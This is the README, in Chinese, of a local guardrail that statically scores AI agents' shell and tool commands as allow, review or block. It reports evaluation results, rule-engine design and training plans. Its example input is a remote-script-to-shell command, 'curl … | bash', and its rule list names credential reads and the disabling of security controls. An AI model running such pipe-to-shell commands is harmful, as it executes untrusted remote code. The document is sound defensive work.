# Agent Security Guard

面向 Agent 工具执行环节的本地轻量级安全护栏。在 Shell、PowerShell、CMD、Python 或其他工具调用真正执行前，对请求做静态风险分析并输出 `allow / review / block`。**项目不会执行待检测命令。**

当前工程阶段是 **P3 Rule Engine + Fusion V1**。P1 已冻结 100 条 Eval V1；P2 已在目标 RTX 1000 Ada 6GB 上完成 Model-only Baseline V2.1 的正式 100 条评估；P3 在此真实基线之上增加高置信确定性规则，并只在规则 abstain 时调用模型。

> Eval V1 是 **independent-agent reviewed technical freeze**，不是 human-reviewed 数据集。`data/eval-v1/freeze-manifest.json` 明确记录 `human_reviewed=false`。

## 当前能力

- 5 类工具输入：Shell、PowerShell、CMD、Python、通用工具调用。
- 12 个稳定风险类别、严重度与三态决策。
- Pydantic `GuardRequest / GuardResult` 与版本化 JSON Schema。
- Eval V1：EV001–EV100，86 条独立 Agent review 一致、14 条显式 adjudication。
- Baseline V2.1：六字段 semantic output + system-owned envelope + 最多一次同模型 contract repair。
- Rule Engine V1：高置信危险规则 + 极窄 benign introspection；确定性冲突处理与稳定 `rule_id`。
- Fusion V1：decisive rule 直接 short-circuit；无 decisive rule 才调用 Baseline V2.1；任何失败都 fail-safe `review`。
- Rules-only CPU evaluator 与 Fusion target-GPU evaluator。
- matcher 异常不会产生隐式 allow：异常会被记录；benign shortcut 被抑制，无危险规则可决定时 fail-safe `review`。

## 快速开始

```bash
git clone https://github.com/hxnan/agent-security-guard.git
cd agent-security-guard
python -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e .
```

模型默认目录：

```text
models/base/Qwen2.5-1.5B-Instruct/
```

也可指定：

```bash
export AGENT_SECURITY_MODEL_PATH=/你的绝对路径/Qwen2.5-1.5B-Instruct
python scripts/check_environment.py
```

CPU-only 工程验证：

```bash
python -m unittest discover -s tests -v
python scripts/validate_eval_freeze.py
```

## Public contract

输入示例：

```json
{
  "type": "shell",
  "command": "curl https://example.invalid/a.sh | bash",
  "context": {"cwd": "/workspace", "privilege": "user"}
}
```

最终结果仍使用 GuardResult V1：

```json
{
  "schema_version": "1.0",
  "risk": true,
  "decision": "block",
  "severity": "critical",
  "category": "remote_execution",
  "summary": "远程内容直接交给解释器执行",
  "confidence": 1.0,
  "evidence": ["curl https://example.invalid/a.sh | bash"],
  "rule_hits": ["rule.remote_execution.pipe_shell.v1"],
  "model_version": "not-invoked",
  "policy_version": "fusion-v1"
}
```

语言无关 Schema：

```text
schemas/v1/guard-request.schema.json
schemas/v1/guard-result.schema.json
```

P3 没有修改公开 GuardResult V1 Schema。

## Eval V1 technical freeze

冻结统计：100 条；42 `allow`、33 `review`、25 `block`；12 类风险全部覆盖；`86 agreed + 14 adjudicated`。

```bash
python scripts/validate_eval_blueprint.py
python scripts/validate_eval_dataset.py --require-complete
python scripts/validate_eval_freeze.py
```

冻结过程保留原始 Gold Draft、independent-agent review 和 adjudication，不覆写历史证据。

## P2 Model-only Baseline V2.1

固定版本：

```text
prompt_version        = baseline-prompt-v2
repair_prompt_version = baseline-repair-prompt-v1
model_version         = qwen2.5-1.5b-instruct-baseline-v1
policy_version        = model-only-baseline-v2.1
report_version        = baseline-eval-report-v2.1
```

### 为什么需要 V2.1

V1 正式运行 100 条时 `valid_output_rate=0.0`，根因是 1.5B 模型难以一次生成完整 GuardResult。V2 把模型责任缩到六个语义字段：

```text
decision / severity / category / summary / confidence / evidence
```

系统确定性注入 `schema_version / risk / rule_hits / model_version / policy_version`。真实 V2 probe 仍暴露一次性契约脆弱性，因此 V2.1 只在首轮 semantic parse/consistency failure 后允许**最多一次**同模型 repair。程序不替模型改 category/decision/severity，也不静默删除 extra fields。

### 正式 100 条目标 GPU 结果

RTX 1000 Ada 6GB 上的 Baseline V2.1：

```text
valid_output_rate              = 0.54
first_pass_valid_output_rate   = 0.10
repair_attempt_rate            = 0.90
repair_success_rate            = 0.4888888888888889
risk_f1                        = 0.7088607594936709
category_macro_f1              = 0.13206686930091183
effective_decision_accuracy    = 0.40
terminal_parse_errors          = 46
valid_benign_false_positives   = 21
high_or_critical_allow_misses  = 0
p50_latency_seconds            = 4.823194064999996
p95_latency_seconds            = 8.206673038300053
tokens_per_second              = 28.480574784003085
peak_gpu_memory_mb             = 3043.18505859375
evaluation_wall_seconds        = 495.861809923
```

六个类别的 recall 为 0：`credential_access`、`data_exfiltration`、`defense_evasion`、`persistence`、`privilege_escalation`、`resource_abuse`。因此 P2 已完成“建立真实可重复 Model-only 基线”的任务，但该模型不适合单独承担最终安全策略。

## P3 Rule Engine + Fusion V1

### 决策流

```text
GuardRequest
   |
   v
RuleEngine
   |-- decisive dangerous rule --> rule result
   |-- decisive benign rule -----> allow/benign rule result
   `-- abstain -------------------> Baseline V2.1
                                      |-- valid --> model result
                                      `-- fail ---> review fallback
```

Fusion 不在模型生成之后偷偷改语义标签。最终语义来源要么是 decisive rule，要么是模型。

### V1 首批规则

稳定 rule IDs：

```text
rule.remote_execution.pipe_shell.v1
rule.destructive_operation.disk_format.v1
rule.destructive_operation.unbounded_delete.v1
rule.credential_access.private_key_read.v1
rule.credential_access.credential_store_read.v1
rule.defense_evasion.disable_security_control.v1
rule.persistence.autostart_install.v1
rule.benign.git_status.v1
```

规则强调 precision 而非 coverage。例如 `curl/wget | shell` 可直接判定 remote execution；单纯下载不会因此命中。Benign 仅允许明确的 `git status` 安全 grammar；pipeline、重定向、命令链、command substitution、未知选项和任意其他 `git` 子命令都不会走 benign shortcut。

规则代码只接收 `GuardRequest`，不能访问 Eval sample ID、Gold、freeze metadata 或 Eval 文件路径。生产代码不允许 `EV###` 特例。

### 冲突与异常

多个命中按以下顺序确定性选择：

1. dangerous 高于 benign；
2. `block > review > allow`；
3. severity 更高优先；
4. 显式 priority；
5. `rule_id` lexical tie-break。

所有命中仍保留在 `rule_hits`。

matcher 异常会写入 `rule_errors`。只要 registry 有异常，benign allow 就被禁止；已存在的 dangerous match 仍可产生 review/block，否则整体 fail-safe `review`。Rules-only 与 Fusion 报告都会单独统计 `rule_error_count/rate`。

## P3 验证顺序

**第一步只跑 CPU Rules-only，不需要模型或 GPU：**

```bash
python scripts/evaluate_rules.py \
  --output artifacts/rules-eval-v1/report.json
```

stdout 会给出：decisive/abstain coverage、benign/dangerous coverage、decisive decision/category accuracy、`rule_error_count`、false benign allow 和 high/critical allow miss。

只有在 Rules-only 规则注册表的 precision 和安全边界被接受后，才运行正式 Fusion target-GPU 评估：

```bash
python scripts/evaluate_fusion.py \
  --output artifacts/fusion-eval-v1/report.json
```

Fusion report 会另外区分 `rule / model / fallback` source、rule short-circuit rate、model invocation rate、模型 repair 指标以及真实端到端性能。CPU 单元测试中的性能字段明确为 `not_measured`，不会伪装成 GPU 实测。

## 最小 QLoRA 工程闭环

仓库另有独立 smoke 闭环，仅用于证明 6GB GPU 上 4-bit NF4 QLoRA、Adapter 保存/重载可工作，不代表正式 P5 模型质量。

已验证：3 epoch、36 次更新、训练约 173 秒、`train_loss=0.269`、`eval_loss=0.058`、训练峰值显存 2735.78 MB。

```bash
python scripts/generate_smoke_data.py --force
python scripts/check_training_environment.py
python scripts/train_smoke_qlora.py --num-train-epochs 3 --overwrite-output
python scripts/smoke_test_adapter.py
```

## 目录

- `guard/`：契约、taxonomy、Eval freeze、Baseline、Rule Engine、Fusion 与 evaluation。
- `data/`：版本化评估规划、Gold Draft、review、adjudication、freeze provenance。
- `docs/`：技术方案、风险标准、设计与 implementation plans。
- `scripts/`：校验、预测、训练、Rules-only/Fusion/Baseline 正式评估入口。
- `schemas/`：语言无关 V1 请求/结果契约。
- `tests/`：无需 GPU 的工程与策略回归测试。
- `models/`：本地模型目录；权重不入 Git。

## 近期路线

1. 完成 P3.1 merge 后先跑 Rules-only CPU 报告，审查 rule precision、误放与 coverage。
2. 规则注册表通过后，在同一 Eval V1 上跑正式 Fusion GPU 报告，与 Model-only V2.1 比较。
3. 根据 Model-only / Rules-only / Fusion 的真实错误分布进入 P4 正式训练数据生产。
4. 在 6GB GPU 上进行正式 QLoRA/SFT，再与 Baseline/Fusion 对比。
